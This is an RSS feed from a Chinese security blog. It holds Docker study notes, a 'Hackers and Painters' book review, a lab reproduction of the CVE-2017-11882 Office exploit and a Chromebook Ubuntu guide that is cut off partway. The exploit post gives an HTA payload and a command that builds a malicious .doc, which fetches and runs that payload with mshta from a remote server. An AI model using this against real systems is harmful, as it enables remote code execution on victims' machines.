<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>安全菜鸟</title>
    <description>韬光养晦 厚积薄发</description>
    <link>https://havysec.github.io/</link>
    <atom:link href="https://havysec.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Fri, 06 Apr 2018 16:17:50 +0800</pubDate>
    <lastBuildDate>Fri, 06 Apr 2018 16:17:50 +0800</lastBuildDate>
    <generator>Jekyll v3.1.1</generator>
    
      <item>
        <title>docker学习笔记</title>
        <description>&lt;h2 id=&quot;section&quot;&gt;基本信息&lt;/h2&gt;

&lt;h3 id=&quot;section-1&quot;&gt;版本等信息&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bash
docker --version
&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;更多的信息&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
docker info
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
docker version
&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;docker&quot;&gt;测试docker&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
docker run hello-world
&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;ubuntu&quot;&gt;尝试运行一个Ubuntu容器&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
docker run -it ubuntu bash
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这样会直接进入到容器的&lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt;就可以直接在里面操作,&lt;code class=&quot;highlighter-rouge&quot;&gt;exit&lt;/code&gt;可以出来&lt;/p&gt;

&lt;h3 id=&quot;section-3&quot;&gt;列出本机拥有的镜像&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
docker images
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
docker image ls
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;两个效果是一样的&lt;/p&gt;

&lt;h3 id=&quot;section-4&quot;&gt;列出所有的容器(正在运行的和停止运行的)&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
docker ps -a
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
docker container ls -a
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
docker container ls -aq
&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;dockerfile&quot;&gt;Dockerfile创建容器&lt;/h2&gt;

&lt;h3 id=&quot;section-5&quot;&gt;案例&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mkdir testdocker &amp;amp;&amp;amp; cd testdocker &amp;amp;&amp;amp; vim Dockerfile&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Use an official Python runtime as a parent image
FROM python:2.7-slim

# Set the working directory to /app
WORKDIR /app

# Copy the current directory contents into the container at /app
ADD . /app

# Install any needed packages specified in requirements.txt
RUN pip install --trusted-host pypi.python.org -r requirements.txt

# Make port 80 available to the world outside this container
EXPOSE 80

# Define environment variable
ENV NAME World

# Run app.py when the container launches
CMD [&quot;python&quot;, &quot;app.py&quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;vim requirements.txt&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Flask
Redis
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;vim app.py&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from flask import Flask
from redis import Redis, RedisError
import os
import socket

# Connect to Redis
redis = Redis(host=&quot;redis&quot;, db=0, socket_connect_timeout=2, socket_timeout=2)

app = Flask(__name__)

@app.route(&quot;/&quot;)
def hello():
    try:
        visits = redis.incr(&quot;counter&quot;)
    except RedisError:
        visits = &quot;&amp;lt;i&amp;gt;cannot connect to Redis, counter disabled&amp;lt;/i&amp;gt;&quot;

    html = &quot;&amp;lt;h3&amp;gt;Hello {name}!&amp;lt;/h3&amp;gt;&quot; \
           &quot;&amp;lt;b&amp;gt;Hostname:&amp;lt;/b&amp;gt; {hostname}&amp;lt;br/&amp;gt;&quot; \
           &quot;&amp;lt;b&amp;gt;Visits:&amp;lt;/b&amp;gt; {visits}&quot;
    return html.format(name=os.getenv(&quot;NAME&quot;, &quot;world&quot;), hostname=socket.gethostname(), visits=visits)

if __name__ == &quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;, port=80)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker build -t friendlyhello .&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt;就是从一个&lt;code class=&quot;highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt;文件创建镜像&lt;code class=&quot;highlighter-rouge&quot;&gt;-t&lt;/code&gt;是指向一个名字和标签比如&lt;code class=&quot;highlighter-rouge&quot;&gt;docker build -t testdocker:01 .&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run -p 4000:80 friendlyhello&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;运行一个容器映射本地的4000端口到容器的80端口，打开浏览器访问&lt;code class=&quot;highlighter-rouge&quot;&gt;http://127.0.0.1:4000/&lt;/code&gt;出现&lt;code class=&quot;highlighter-rouge&quot;&gt;Hello World!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run -d -p 4000:80 friendlyhello&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;加上&lt;code class=&quot;highlighter-rouge&quot;&gt;-d&lt;/code&gt;参数可以后台运行&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker container ls&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;列出正在运行的容器&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker container stop 1fa4ab2cf395&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;停止刚刚后台运行的容器&lt;/p&gt;

&lt;h2 id=&quot;section-6&quot;&gt;分享你的镜像&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker login&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;登陆&lt;code class=&quot;highlighter-rouge&quot;&gt;Docker hub&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker tag imagename username/repository:tag&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;example:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker tag friendlyhello john/get-started:part2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;给本地的镜像一个&lt;code class=&quot;highlighter-rouge&quot;&gt;tag&lt;/code&gt;好可以上传到自己的仓库，可以&lt;code class=&quot;highlighter-rouge&quot;&gt;docker image ls&lt;/code&gt;查看自己的镜像。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker push john/get-started:part2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;上传有标签的镜像到自己的仓库,上传成功可以在仓库中查看。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run -p 4000:80 john/get-started:part2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;直接运行刚刚上传自己仓库的镜像，这个时候就不需要安装或者上传什么文件了，直接把之前的有文件的镜像拿过来用就好了。&lt;/p&gt;

&lt;h2 id=&quot;section-7&quot;&gt;服务化&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt;文件主要是用来控制容器的&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt;文件&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;version: &quot;3&quot;
services:
  web:
    # replace username/repo:tag with your name and image details
    image: username/repo:tag
    deploy:
      replicas: 5
      resources:
        limits:
          cpus: &quot;0.1&quot;
          memory: 50M
      restart_policy:
        condition: on-failure
    ports:
      - &quot;80:80&quot;
    networks:
      - webnet
networks:
  webnet:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;大概内容就是产生5个容器，10%cpu，50M内存，挂掉自动重启，端口映射”80:80”，定义一个负载均衡网络。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose build&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose up -d&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose down&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;分别是创建、运行、关闭删除。其实我感觉到这里就差不多够用了，可以直接去&lt;code class=&quot;highlighter-rouge&quot;&gt;hub&lt;/code&gt;上面找一些官方的镜像练练手。&lt;/p&gt;

&lt;p&gt;在使用&lt;code class=&quot;highlighter-rouge&quot;&gt;docker stack deploy&lt;/code&gt;之前先运行&lt;code class=&quot;highlighter-rouge&quot;&gt;docker swarm init&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker swarm init&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;可能会提示你选择网卡接口&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker stack deploy -c docker-compose.yml getstartedlab&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;部署一个名字叫做&lt;code class=&quot;highlighter-rouge&quot;&gt;getstartedlab&lt;/code&gt;的app，部署了5个镜像实例。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker stack rm getstartedlab&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;移除这个部署环境&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker swarm leave --force&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;强制离开这个&lt;code class=&quot;highlighter-rouge&quot;&gt;swarm&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;官方&lt;code class=&quot;highlighter-rouge&quot;&gt;Cheat sheet&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;## List Docker CLI commands
docker
docker container --help

## Display Docker version and info
docker --version
docker version
docker info

## Execute Docker image
docker run hello-world

## List Docker images
docker image ls

## List Docker containers (running, all, all in quiet mode)
docker container ls
docker container ls --all
docker container ls -aq
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker build -t friendlyhello .  # Create image using this directory&#39;s Dockerfile
docker run -p 4000:80 friendlyhello  # Run &quot;friendlyname&quot; mapping port 4000 to 80
docker run -d -p 4000:80 friendlyhello         # Same thing, but in detached mode
docker container ls                                # List all running containers
docker container ls -a             # List all containers, even those not running
docker container stop &amp;lt;hash&amp;gt;           # Gracefully stop the specified container
docker container kill &amp;lt;hash&amp;gt;         # Force shutdown of the specified container
docker container rm &amp;lt;hash&amp;gt;        # Remove specified container from this machine
docker container rm $(docker container ls -a -q)         # Remove all containers
docker image ls -a                             # List all images on this machine
docker image rm &amp;lt;image id&amp;gt;            # Remove specified image from this machine
docker image rm $(docker image ls -a -q)   # Remove all images from this machine
docker login             # Log in this CLI session using your Docker credentials
docker tag &amp;lt;image&amp;gt; username/repository:tag  # Tag &amp;lt;image&amp;gt; for upload to registry
docker push username/repository:tag            # Upload tagged image to registry
docker run username/repository:tag                   # Run image from a registry
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker stack ls                                            # List stacks or apps
docker stack deploy -c &amp;lt;composefile&amp;gt; &amp;lt;appname&amp;gt;  # Run the specified Compose file
docker service ls                 # List running services associated with an app
docker service ps &amp;lt;service&amp;gt;                  # List tasks associated with an app
docker inspect &amp;lt;task or container&amp;gt;                   # Inspect task or container
docker container ls -q                                      # List container IDs
docker stack rm &amp;lt;appname&amp;gt;                             # Tear down an application
docker swarm leave --force      # Take down a single node swarm from the manager
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;hr /&gt;
&lt;blockquote&gt;
  &lt;p&gt;我在黑暗中，化作一个火种，想为你，点亮整片的星光，追随着微风，住进了美梦，你笑着，躲在我心中，不要烟火不要星光，只要问问内心的想法，在我的世界，可有个角落，是你不曾懂的远方。。。
——来自华晨宇《微光》&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 04 Apr 2018 00:00:00 +0800</pubDate>
        <link>https://havysec.github.io/2018/04/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">https://havysec.github.io/2018/04/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>笔记</category>
        
        
      </item>
    
      <item>
        <title>《黑客与画家》读后感</title>
        <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2018-02-24/1.png&quot; alt=&quot;黑客与画家&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;原书作者 保罗*格雷厄姆&lt;/p&gt;

&lt;p&gt;其实为什么要读这本书呢？说实话是想巩固我想成为一个优秀黑客的信心！前段时间由于各种事情导致我整个人感觉很”丧“。读完这本书之后感觉稳当了一点。&lt;/p&gt;

&lt;p&gt;保罗 格雷厄姆是谁？ &lt;br /&gt;
20世纪60年代出生在一个中产阶级家庭。父亲是设计核反应堆的物理学家。青少年时代开始编程，爱好广泛写过小说、大学主修哲学、研究生主攻人工智能、拿到博士学位后报了暑期班学习绘画梦想成为画家。1992年回到波士顿一家创业公司担任程序员，生活窘迫。最后放弃画家梦想，1995年开始找合作伙伴一起创业。创业项目叫做Viaweb是最早的服务器端软件，也可能是淘宝网的原型。该项目最后被雅虎以4900万美金收购并更名为Yahoo Store。之后在雅虎上班，不久后辞职。2005年去哈佛大学演讲后决定做天使投资，帮助更多的好项目可以挣钱。这也是为什么他后来被认为是创业之父。&lt;/p&gt;

&lt;p&gt;1 为什么书呆子不受欢迎 &lt;br /&gt;
作者认为爱读书的学生通常是不受欢迎的，这里的不受欢迎指的是不能和同学好好玩耍。但是为什么呢？一个小孩成绩优秀、又聪明，为什么会不受欢迎呢？一种原因是其他小孩嫉妒，但是这样会招来异性的关注。作者认为真正的原因是他们不想让自己受欢迎，他们更想要的是聪明，这不仅仅是成绩好，更多的是他们想做伟大的事情。所以他们关注的点不是怎么让自己更受欢迎！文艺复兴时期的代表人物阿尔伯蒂有一句名言：“任何一种艺术，不管是否重要，如果你想要在该领域出类拔萃，就必须全身心投入。”作者还认为公立学校的老师就是监狱里面的狱卒，家长们也只是希望孩子们在“监狱”里面不要闹出什么事情，好让自己有时间工作好养活家里。其实就算孩子关在监狱里面也没关系，令人难过的是孩子被关在监狱里面，花10年的时间去记住一些毫无意义的事实。那么家长看见孩子这么痛苦为什么不做点什么呢？大多数家长觉得孩子痛苦是因为青春期到了就应该痛苦，是生理原因。我觉得这是胡扯。蒙古的游牧民族在13岁时难道也这么空虚吗？他们其实是被逼“疯”的。成年人认为“正直”、“人格”等同于“听话”。作者刚开始觉得“老成”就是不说话，他发誓不要成为老成的人，但是后来他明白它的真正意思是熟练的触碰，反义词是”笨拙“。&lt;/p&gt;

&lt;p&gt;2 黑客与画家 &lt;br /&gt;
黑客与画家的相同之处是他们都是创造者，他们都试图创作出优秀的作品。作者认为动态类型语言要优于静态类型语言。设计不应该只让不懂技术的人去设计，应该让真正的程序员去设计。对于画家来说学会画画就必须要自己动手去画，对于黑客来说要写优秀的软件就必须动手学习编程。最终得到原创和优美的作品。他认为写代码就应该边写边修改，不要太早的优化，也不要太早的设计。通常你会发现你的设计都没有用上。从他人的角度思考问题正是成功的奥秘所在。“换位思考”不是意味着自我牺牲，比如打仗的时候就是为了打败对手。&lt;/p&gt;

&lt;p&gt;3 不能说的话  &lt;br /&gt;
这一章作者用了一些法则来判断哪些话是不能说的！第一点不要随波逐流，有人说：“要根据社会需要，改造自己的思想”这是不对的，如果凡是不认同社会之处，你连想都不敢想，马上就放弃自己的观点，那才会真正出现问题。要时刻保持怀疑的态度。第二点真话不能说。第三点时空差异，看看古代有哪些不能说的话。第四点道貌岸然，指的是家长在孩子面前不能说脏话，他们觉得孩子相信圣诞老人很可爱，但是他们这么做只是为了自己。孩子们生活在一个精心构造的环境里面，只有他们长大后才会发现一切都是假的，他们才知道自己眼里面的世界是不真实的。第五点机制。最后作者说了自己为什么要找到不能说的话，他是出于好奇。如果找到那些不能说的话下一步该怎么办？作者建议就是别说，至少在合适的场合再说，只打值得的仗。自由思考比畅所欲言更重要，不能说的话太多了，如果口无遮拦，你就没时间做正事了。守口如瓶的真正缺点在于，你无法享受讨论带来的好处。讨论一个观点会产生更多的观点，不讨论就什么也没有了。作者建议我们永远保持质疑，我觉得这是我读这本书最大的收获之一。比方说荷兰人认为自己思想开放，有谁会认为自己的思想不开放？如果你想要清晰的思考，就必须远离人群。但是走得越远，你的处境就会越困难，受到的阻力也会越大，因为你没有迎合社会习俗，而是一步步地与它背道而驰。小时候，每个人都会鼓励你不断成长，变成一个心智成熟、不再小孩子脾气的人。但是，很少人鼓励你继续成长，变成一个怀疑和抵制社会错误潮流的人。如果你自己就是潮流的一部分，怎么能看见潮流的方向呢？你只能永远保持质疑。问自己，什么话是我不能说的？为什么？&lt;/p&gt;

&lt;p&gt;4 良好的坏习惯  &lt;br /&gt;
黑客是优秀的程序员，是可以随心所欲控制电脑的人。黑客是不服从管教的，这是他们的本性。其实公民自由可以使国家富强，更确切的说是国家富强使人民自由。在作者看来一个人们拥有言论自由和行动自由的社会，往往最有可能采纳最优方案，而不是采纳最有权势的人提出的方案。&lt;/p&gt;

&lt;p&gt;5 另一条路  &lt;br /&gt;
1995年夏天，作者和朋友罗伯特 莫里斯决定创业。刚开始打算写一个桌面软件。没过几天，他们打算让软件在服务器上运行，浏览器作为操作界面。由于软件转移到服务器的趋势才刚刚开始，所以作者写了一些对未来的憧憬。比方说网络界面的Email。随时随地可以收发邮件，那为什么文档不可以呢？为什么所有的数据非得禁锢在一台遥远的计算机上？互联网软件可以使用你想用的任何语言。可能是作者由衷喜欢Lisp，这也让我对这个编程语言产生了兴趣。语言可以带来优势，一方面你可以做出别人做不出来的功能，一方面如果别人读不懂你的源代码，这两个方面都可以减少别的竞争者的竞争力。互联网软件的bug易于复现也易于修补，客服人员距离技术人员非常近，遇到难题立马找技术人员，因为他们可以复现问题，而不是照着指导手册读。作者再次强调了一边写代码完成功能，一边构思，而不是一次性把一年要做的功能都写出来，这样会延迟功能的实现而且会阻碍实现过程中产生的构思。如果有好的构思就应该立马去实现。但是这样写软件只适用与小型的、由优秀可靠的程序员组成的开发团队，不适合于大型的、充斥大量平庸之辈的软件公司。关注客户，如何让客户简单的使用软件是非常重要的。Viaweb是把个人和小企业当作目标客户，这些客户决策灵活，又需要低成本的新技术。但是对于大公司他们更喜欢话更多的钱买看似不一样的东西，可能他们觉得这样才有面子。作者认为像Windows这样的桌面操作系统迟早是要淘汰的，只要有人可以作出更好的互联网软件，就不再需要使用漏洞百出的WIndows操作系统。他还觉得微软公司是害怕你的，因为1975年，上一次发布软件的新方式出现时，他也曾跟你一样白手起家。&lt;/p&gt;

&lt;p&gt;6 如何创造财富  &lt;br /&gt;
致富的最好的办法就是自己创业，或者加入创业公司。创业类似与中世纪集资进行航海冒险活动相差无几。创业公司其实是解决某个技术难题的小公司。许多人对此一无所知但是依然赚了钱。我想也是这样的。作者认为你赚多少钱就要忍受多少钱带来的痛苦，如果创业很轻松那么所有人就都去了。其实致富的方法有很多，总的来说就是你需要做出人们需要的东西就可以了。金钱不等于财富，创造有价值的东西就是创造财富。什么是财富？幸福感、金钱、外出旅行这种行为等等都叫财富。而金钱是财富的一种简便的表达方式：金钱是流动的财富，两者往往可以互相转化。要致富，你需要2样东西：可测量性和可放大性。CEO是同时具备这两个重要性的。公司的表现就是CEO的表现。CEO 的决策决定了整个公司的方向。类似的电影明星、国家运动员。同样的他们的风险也很高。没有风险就几乎没有放大性。你可以成为具备这个特质的小团体的一部分。小团体等同于可测量性，高科技等同于可放大性。选择较难的方向更有助于你的成功，最好的防守就是进攻，这样你就不需要其他防御手段了。用户数量决定了你的项目是否成功，风险投资商非常在乎用户数量这个问题。&lt;/p&gt;

&lt;p&gt;7 关注贫富分化  &lt;br /&gt;
多劳多得，CEO的收入是平常人的100多倍。这一段可以说是都在说：“你拥有的技术越超群，你通过技术换来的金钱就越多”比方说：乔布斯、比尔盖茨、飞机飞行员等。&lt;/p&gt;

&lt;p&gt;8 防止垃圾邮件的一种方法  &lt;br /&gt;
作者认为彻底防止垃圾邮件是可以做到的，但是作者用到的方式是统计学方法，贝叶斯方法。&lt;/p&gt;

&lt;p&gt;9 设计者的品味 &lt;br /&gt;
如何做出优美的产品？好的设计就是简单的设计：在数学方面数学证明越短越好。好设计是永不过时的设计：只要没错，每个数学证明都是永不过时的。（PS：不是很想写这一段，感觉意义不大。）&lt;/p&gt;

&lt;p&gt;10 编程语言解析  &lt;br /&gt;
程序员的入门科普知识，讲了机器语言、高级语言、开源程序、语言战争、文艺复兴、面向对象编程。&lt;/p&gt;

&lt;p&gt;11 100年后的编程语言  &lt;br /&gt;
作者预测，未来硬件的性能大幅提高、新曾的运算能力会被糟蹋掉。他认为语言的发展很慢、理论上今天就可以设计出100年以后的语言。&lt;/p&gt;

&lt;p&gt;12 拒绝平庸  &lt;br /&gt;
作者因为喜欢Lisp而成功，这是他的秘密武器。毕竟用它的人不多，这就是他们的优势。暗示提高个人优势吧，还认为要学习就学习最好的语言，在他看来Lisp就可能是最好的语言。&lt;/p&gt;

&lt;p&gt;13 书呆子的复仇  &lt;br /&gt;
经理是奇葩般的存在，对技术一无所知、对技术有强烈的个人观点。他们可能会要求你们用一种语言开发，因为这种语言是业内标准。这样即使除了问题，他也可以甩锅。这也导致很多人辞职。作者认为每种语言都有自己的优势，再次强调选择语言和Lisp语言的优势和强大。&lt;/p&gt;

&lt;p&gt;14 梦寐以求的编程  &lt;br /&gt;
易于安装、简洁、可编程性、一次性编程、函数库、效率、时间、再设计。&lt;/p&gt;

&lt;p&gt;15 设计与研究 &lt;br /&gt;
设计追求的是“好”、研究追求的是“新”。&lt;/p&gt;

&lt;p&gt;总体感觉值得一读&lt;/p&gt;

&lt;hr /&gt;
&lt;blockquote&gt;
  &lt;p&gt;保持怀疑——来自《黑客与画家》&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

</description>
        <pubDate>Sat, 24 Feb 2018 00:00:00 +0800</pubDate>
        <link>https://havysec.github.io/2018/02/%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6-%E8%AF%BB%E5%90%8E%E6%84%9F/</link>
        <guid isPermaLink="true">https://havysec.github.io/2018/02/%E9%BB%91%E5%AE%A2%E4%B8%8E%E7%94%BB%E5%AE%B6-%E8%AF%BB%E5%90%8E%E6%84%9F/</guid>
        
        <category>读后感</category>
        
        
      </item>
    
      <item>
        <title>内存泄漏漏洞复现(CVE-2017-11882-Memory Corruption Vulnerability)</title>
        <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-11-26/vulnerability.png&quot; alt=&quot;vulnerability&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-11882-memory-corruption-vulnerability&quot;&gt;内容：内存泄漏漏洞复现(CVE-2017-11882-Memory Corruption Vulnerability)&lt;/h3&gt;
&lt;p&gt;1、 利用文件制作&lt;br /&gt;
2、 效果演示&lt;/p&gt;

&lt;h3 id=&quot;xxxdoc&quot;&gt;xxx.doc制作步骤&lt;/h3&gt;

&lt;p&gt;下载代码&lt;a href=&quot;https://github.com/Ridter/CVE-2017-11882&quot;&gt;github-Ridter&lt;/a&gt;到某linux系统上面，系统要有&lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;服务&lt;/p&gt;

&lt;p&gt;在服务器的&lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt;目录下生成&lt;code class=&quot;highlighter-rouge&quot;&gt;execute.hta&lt;/code&gt;(名字随意)文件&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;HTML&amp;gt;
&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&amp;gt;
&amp;lt;HEAD&amp;gt;
&amp;lt;script language=&quot;VBScript&quot;&amp;gt;
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
objShell.Run &quot;calc.exe&quot;
self.close
&amp;lt;/script&amp;gt;
&amp;lt;body&amp;gt;
demo
&amp;lt;/body&amp;gt;
&amp;lt;/HEAD&amp;gt;
&amp;lt;/HTML&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;执行&lt;code class=&quot;highlighter-rouge&quot;&gt;python Command109b_CVE-2017-11882.py -c &quot;mshta http://192.168.176.129/execute.hta&quot; -o havy_109.doc&lt;/code&gt;得到利用文件&lt;/p&gt;

&lt;p&gt;43b同上&lt;/p&gt;

&lt;h3 id=&quot;controller&quot;&gt;controller效果&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-11-26/1.png&quot; alt=&quot;controller&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;section&quot;&gt;参考链接&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/Ridter/CVE-2017-11882&quot;&gt;github-Ridter&lt;/a&gt; &lt;br /&gt;
&lt;a href=&quot;https://github.com/embedi/CVE-2017-11882&quot;&gt;github-embedi&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;keep learning ！  –by myself&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 26 Nov 2017 00:00:00 +0800</pubDate>
        <link>https://havysec.github.io/2017/11/CVE-2017-11882-%E5%A4%8D%E7%8E%B0/</link>
        <guid isPermaLink="true">https://havysec.github.io/2017/11/CVE-2017-11882-%E5%A4%8D%E7%8E%B0/</guid>
        
        <category>漏洞复现</category>
        
        
      </item>
    
      <item>
        <title>Chromebook安装Ubuntu</title>
        <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-10-31/shopping.jpeg&quot; alt=&quot;chromebook&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;chromebookubuntu&quot;&gt;内容：chromebook入手后安装ubuntu&lt;/h3&gt;

&lt;p&gt;今年5月份买的&lt;code class=&quot;highlighter-rouge&quot;&gt;chromebook&lt;/code&gt;，买它是因为小、轻想着以后出门带着很方便。而且可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;Cronton&lt;/code&gt;安装&lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;，这样就很爽了。而且这款&lt;/p&gt;

&lt;h3 id=&quot;section&quot;&gt;安装步骤(打开浏览器)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + alt + t&lt;/code&gt; 打开&lt;code class=&quot;highlighter-rouge&quot;&gt;crosh&lt;/code&gt; &lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;crosh&lt;/code&gt;输入shell进入linux命令行 &lt;br /&gt;
